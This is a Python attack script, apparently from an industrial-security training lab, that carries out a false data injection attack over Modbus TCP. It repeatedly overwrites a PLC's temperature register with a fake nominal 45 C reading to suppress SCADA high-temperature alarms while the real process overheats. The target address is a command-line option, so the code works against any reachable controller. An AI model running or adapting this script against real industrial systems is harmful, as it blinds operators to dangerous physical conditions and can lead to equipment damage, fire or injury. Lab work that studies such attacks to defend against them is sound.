#!/usr/bin/env python3
"""
IndustryLab — Industrial Attack 2: False Data Injection Attack (FDIA) / Sensor Spoofing
Continuously overwrites Holding Register 0 (Temperature Sensor PV) to report nominal 45.0 C (450)
while the physical system overheats, effectively blinding the SCADA operators (Loss of View / Stuxnet replay).
"""

import sys
import time
import argparse
import logging

try:
    from pymodbus.client.sync import ModbusTcpClient
except ImportError:
    try:
        from pymodbus.client import ModbusTcpClient
    except ImportError:
        ModbusTcpClient = None


def execute_fdia(target_ip="127.0.0.1", port=502, spoof_temp_c=45.0, duration_s=10.0, interval_s=0.2):
    print(f"\n[!] INITIATING FDIA: Sensor Spoofing Attack on {target_ip}:{port}...")
    print(f"[*] Target Spoofed Value: {spoof_temp_c} C (Raw Reg Value: {int(spoof_temp_c * 10)})")

    if ModbusTcpClient is None:
        print("[!] pymodbus client required.")
        return False

    client = ModbusTcpClient(target_ip, port=port, timeout=2.0)
    if not client.connect():
        print(f"[-] Connection failed to {target_ip}:{port}.")
        return False

    spoof_val = int(spoof_temp_c * 10)
    start_t = time.time()
    injections = 0

    print("[*] Actively injecting false sensor frames to suppress SCADA high-temperature alarms...")
    try:
        while time.time() - start_t < duration_s:
            res = client.write_register(0, spoof_val, unit=1)
            if res.isError():
                print(f"[-] Write register rejected: {res}")
                break
            injections += 1
            time.sleep(interval_s)
    except KeyboardInterrupt:
        print("\n[*] FDIA stopped by user.")
    finally:
        client.close()

    print(f"[+] FDIA Completed. Injected {injections} spoofed frames. SCADA operators blinded during attack window.")
    return injections > 0


def main():
    parser = argparse.ArgumentParser(description="False Data Injection Sensor Spoofing")
    parser.add_argument("--target", default="127.0.0.1", help="Target PLC IP")
    parser.add_argument("--port", type=int, default=502, help="Target PLC Port")
    parser.add_argument("--spoof-temp", type=float, default=45.0, help="Spoofed temperature in Celsius")
    parser.add_argument("--duration", type=float, default=5.0, help="Attack duration in seconds")
    args = parser.parse_args()

    execute_fdia(target_ip=args.target, port=args.port, spoof_temp_c=args.spoof_temp, duration_s=args.duration)


if __name__ == "__main__":
    main()
